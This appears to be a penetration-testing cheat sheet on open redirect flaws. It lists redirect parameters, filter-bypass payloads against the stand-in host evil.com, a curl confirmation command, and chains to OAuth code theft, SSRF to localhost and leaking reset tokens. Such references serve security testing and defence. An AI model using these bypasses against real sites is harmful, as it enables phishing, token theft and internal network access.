# Open Redirect

A redirect to an attacker-controlled URL. Low alone, high as a chain input (OAuth token
theft, SSRF allowlist bypass, phishing under a trusted domain).

---

## Parameters

```
?redirect=  ?url=  ?next=  ?return=  ?returnUrl=  ?continue=  ?dest=  ?r=  ?u=
?callback=  ?target=  ?to=  ?link=  ?image=  ?checkout=  ?goto=
```

Also: `Referer`-based redirects, `Location` from a header, post-login `next`.

---

## Bypass set

```
https://evil.com
//evil.com
/\/evil.com
https:evil.com
https://target.com@evil.com
https://target.com.evil.com
https://evil.com#target.com
https://evil.com?target.com
https://evil.com%00.target.com
https://evil.com\@target.com
/javascript:alert(1)      (in some contexts)
```

Path-relative escapes: `..%2f..%2f..%2f%2fevil.com`, `%2f%2fevil.com`.

---

## Filter shapes and counters

| Filter | Bypass |
|---|---|
| `startsWith('/')` | `//evil.com` |
| `startsWith('https://target')` | `https://target.evil.com` |
| `includes('target.com')` | `https://evil.com/?target.com` |
| `endsWith('target.com')` | `https://eviltarget.com` |
| strips `//` once | `///evil.com`, `/%2f%2fevil.com` |
| allowlist exact | `https://target.com@evil.com` |

---

## Confirmation

`curl -i 'https://t/redirect?url=https://evil.com'` → `Location: https://evil.com`.

Must be a **server-side** 302, not a JS redirect (JS is weaker but still useful for
`javascript:`).

---

## Chains

- OAuth: `redirect_uri` open redirect → auth code theft.
- SSRF: open redirect on an allowlisted host → `127.0.0.1`.
- Password reset: reset link redirects onward, token in `Referer` to evil.com.
- SAML: `RelayState` open redirect.

---

## Go deeper

1. Test the login `next` param — it survives authentication.
2. Test the logout `return` param.
3. Test with a `javascript:` and a `data:` scheme.
4. Test the redirect after 302: does it follow a second hop?

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
